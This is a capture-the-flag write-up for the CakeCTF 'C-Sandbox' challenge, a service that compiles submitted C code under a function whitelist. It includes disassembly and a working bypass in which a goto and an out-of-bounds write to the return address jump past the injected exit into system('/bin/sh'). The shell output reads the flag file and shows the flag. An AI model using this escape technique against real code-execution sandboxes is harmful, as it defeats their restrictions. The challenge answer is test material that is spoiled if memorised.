# C-Sandbox

<span id="-misc"></span><span id="misc" class="tag">misc</span>

## Analysis

This challenge runs a service that accepts C code via TCP and then
compiles and runs it.

There's a whitelist of functions that can be called (`puts`, `printf`,
`scanf`, `exit`). If the code tries to call anything that's not on the
list, the compiler inserts a call to `puts` with a message and a call to
`exit` just before the call to the illegal function.

I edited the `compiler.py` file in order to get the binary generated by
the compiler.

For example, the following C code

    int main(void) {
        system("/bin/sh");
    }

gets compiled to this. You can see the calls to `puts` and `exit` that
weren't on the source code.

    i_gefâž¤  disas main
    Dump of assembler code for function main:
       0x0000000000401150 <+0>:     push   rbp
       0x0000000000401151 <+1>:     mov    rbp,rsp
       0x0000000000401154 <+4>:     movabs rdi,0x40200c
       0x000000000040115e <+14>:    call   0x401030 <puts@plt>
       0x0000000000401163 <+19>:    mov    edi,0x1
       0x0000000000401168 <+24>:    call   0x401050 <exit@plt>
       0x000000000040116d <+29>:    movabs rdi,0x402004
       0x0000000000401177 <+39>:    mov    al,0x0
       0x0000000000401179 <+41>:    call   0x401040 <system@plt>
       0x000000000040117e <+46>:    xor    eax,eax
       0x0000000000401180 <+48>:    pop    rbp
       0x0000000000401181 <+49>:    ret

## Solution

My idea was to skip the call to `system` (and the injected calls to
`puts` and `exit`) and then corrupt the return address in order to jump
to right after the call to `exit`. The binary was compiled without PIE,
so we know where to return to in advance.

I used a `goto` to skip the call to `system`, but the compiler decided
to optimize it out. To fix this I added a `volatile` variable which gets
used in an `if`.

The pointer `arr` is used to currupt the return address to just after
the `exit` call and just before the `system` call.

    int main(void) {
        int volatile pls_no_optimize = 1;
        int arr[1];

        arr[3] = 0x4011a7;
        arr[4] = 0;
        if (pls_no_optimize)
            goto skip;
        system("/bin/sh");

    skip:
        printf("hi, this is a skip");
    }

    [+] Generating bitcode...
    [+] Instrumenting...
    [+] Translating to assembly...
    [+] Compiling...
    [+] Running...
    ls
    compiler.py
    flag-0de0e34fe4e95ae2fcb8b185c009ba76.txt
    libCSandbox.so
    cat flag-0de0e34fe4e95ae2fcb8b185c009ba76.txt
    CakeCTF{briI1ng_yoO0ur_oO0wn_gaA4dgeE3t!}

And there's the flag: `CakeCTF{briI1ng_yoO0ur_oO0wn_gaA4dgeE3t!}`.
